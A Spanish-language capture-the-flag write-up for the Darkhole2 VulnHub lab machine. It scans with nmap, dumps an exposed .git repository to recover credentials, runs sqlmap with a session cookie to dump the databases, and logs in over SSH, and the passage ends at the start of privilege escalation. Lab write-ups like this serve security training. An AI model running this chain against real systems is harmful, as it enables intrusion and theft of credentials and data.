# Darkhole2-Vulnhub-Writeup
Writeup de la maquina Darkhole2 de Vulnhub

El sistema se pondra a prueba en VirtualBox

![descripcion](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/blob/main/imagenes/descripcion.jpg)

## Escaneo de Red
En primer lugar, tenemos que obtener la dirección IP del objetivo

![uso del netdiscover](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/blob/main/imagenes/netdiscover.jpg)

~~~
netdiscover
~~~

Iniciando Nmap para avanzar en este proceso. Realizamos un escaneo agresivo (-A) para la enumeración de puertos abiertos y descubrimos la siguiente información de puertos:

~~~
nmap -A 192.168.40.133
~~~

![uso del nmap](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/blob/main/imagenes/nmap.jpg)

De acuerdo con la salida de Nmap, tenemos:
Un servidor SSH que se ejecuta en el puerto 22.
Un servicio HTTP ejecutándose (servidor Apache) en el puerto 80, así como una página http-git.

## Enumerar el servidor web
Debido a que el servidor Apache está escuchando en el puerto 80, podemos verificarlo inmediatamente en el navegador.

![visualizacion de laweb](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/blob/main/imagenes/web.jpg)

Decidimos echar un vistazo a la página de inicio de sesión.

![vista login](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/blob/main/imagenes/login.jpg)

Decidimos echar un vistazo a la página http-git que descubrimos previamente durante el escaneo agresivo de Nmap.
![vista repositorio git](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/blob/main/imagenes/git.jpg)

Usamos git-dumper
Es una herramienta para adquirir un repositorio git de un sitio web para obtener una mejor comprensión del conjunto de datos.
Simplemente usamos la función de clonación de git.
Creamos un directorio para nuestro respaldo .git

![vista gitclone](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/blob/main/imagenes/gitclone.jpg)
~~~
cd darkhole2
git clone https://github.com/arthaud/git-dumper.git
ls
cd git-dumper 
mkdir backup
~~~

Después de descargar la herramienta, intentamos ejecutarla con python .

![vista gitlog](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/blob/main/imagenes/gitdumpe%20python.jpg)
~~~
python3 git_dumper.py http://192.168.40.133/.git/ backup
~~~

Después de eso, accedimos al directorio de respaldo y el archivo de registro tenía tres entradas. Usando git, abrimos una de las entradas para continuar.
Finalmente, descubrimos las credenciales de la página de inicio de sesión descubiertas antes durante el abuso de http.

![vista gitlog](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/blob/main/imagenes/git%20log.jpg)
~~~
cd backup
ls
git log
git diff  a4d900a8d85e8938d3601f3cef113ee293028e10
~~~

Finalmente, descubrimos las credenciales de la página de inicio de sesión descubiertas antes durante el abuso de http.

~~~
Email: lush@admin.com
Password: 321
~~~

## Explotación
Nos logeamos en esa página, parece ser adecuada para tácticas relacionadas con la inyección de SQL.

![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/assets/129236342/375d0afe-a663-4ae2-8ed7-7b8d8306ebf3)

### BURP SUITE
Entonces, usamos burpsuite para recopilar las cookies de esta página. Será ventajoso para nuestra estrategia de inyección SQL.

![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/assets/129236342/67b83dec-2f36-473b-a4fa-3e095e98f890)

### Usando SQLMAP
Insertamos la cookie capturada anteriormente en sqlmap 

![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/assets/129236342/a1530d38-1748-4d26-be2e-8bea8c6bd538)
![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/assets/129236342/6f481be5-6ea5-4d6d-a0b4-cc0253ba88c4)
~~~
sqlmap -u "http://192.168.40.133/dashboard.php?id=1" --cookie="PHPSESSID=674p5g2tk29ieclq6iqdtc2mu4" --dbs –batch
~~~

Obtuvimos algunas bases de datos en cuestión de minutos. Entonces, iniciamos otro comando (usando el parámetro -D) para volcar la base de datos llamada darkhole_2

![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/assets/129236342/3cd9ae27-b481-4022-a0bf-34499d6aa230)

![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/assets/129236342/3480ebbb-a385-4252-b9d4-659b051f6225)

~~~
sqlmap -u "http://192.168.40.133/dashboard.php?id=1" --cookie="PHPSESSID=674p5g2tk29ieclq6iqdtc2mu4" -D darkhole_2 --dump-all --batch
~~~

En cuestión de momentos, descubrimos las credenciales ssh para el usuario Jehad en esta base de datos de volcado. 

~~~
User: jehad
Pass: fool
~~~

Ahora, usando estas credenciales ssh, iniciamos sesión con el usuario Jehad y abrimos su identificación para autenticarlo.

![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/assets/129236342/cf4abf46-fdfd-475e-95b5-290e7efff130)

~~~
ssh jehad@192.168.40.133
id
~~~

## Escala de privilegios

Vemos un cron  que se ejecuta con el usuario losy.

Aquí podemos ver que un servidor web se está ejecutando en el puerto 9999. Cuando vemos el contenido del código fuente, vemos que esto permite la ejecución remota de comandos.

![image](https://github.com/RamosAlicer/Darkhole2-Vulnhub-Writeup/assets/129236342/dc94e9dc-3ae6-4bb0-8952-f6756a3bdcb7)

    cat /etc/crontab




